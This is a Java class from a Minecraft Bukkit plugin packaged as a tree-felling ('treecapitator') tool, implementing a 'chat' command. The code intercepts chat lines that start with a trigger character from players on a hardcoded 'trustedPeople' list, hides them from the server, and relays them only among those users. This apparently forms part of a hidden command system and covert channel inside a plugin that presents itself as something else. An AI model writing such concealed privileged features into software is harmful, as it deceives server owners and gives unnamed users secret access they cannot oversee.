package me.bow.treecapitatorultimate.commands.Miscs;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Tuple;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.UUID;

import static me.bow.treecapitatorultimate.Start.CHAT_TRIGGER;
import static me.bow.treecapitatorultimate.Utils.MathUtils.randomEnum;

@Command.Info(command = "chat", description = "Self-explanatory", category = CommandCategory.Miscs)
public class Chat extends Command {
    HashMap<UUID, Tuple<Character, ChatColor>> triggers = new HashMap<>();

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (args.isEmpty()) {
            triggers.put(p.getUniqueId(), null);
            this.Reply(p, "Chat disabled");
        } else {
            char c = args.get(0).charAt(0);
            triggers.put(p.getUniqueId(), new Tuple<>(c, randomEnum(ChatColor.class)));
            this.Reply(p, "Chat enabled!\nType to chat by prepending " + c + " in front of your message!");
        }
    }

    @Override
    public void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if(e.getMessage().length() <= 0) return;
        if (!Start.Instance.trustedPeople.contains(p.getUniqueId()) || !e.getMessage().startsWith(String.valueOf(CHAT_TRIGGER)))
            return;
        e.setCancelled(true);
        e.setMessage(e.getMessage().substring(1));
        ChatColor color = ChatColor.RED;
        for (Player pe : Bukkit.getOnlinePlayers()) {
            if (!Start.Instance.trustedPeople.contains(pe.getUniqueId())) continue;
            pe.sendMessage(Start.Prefix + color + p.getDisplayName() + ": " + ChatColor.RESET + e.getMessage());
        }
    }
}
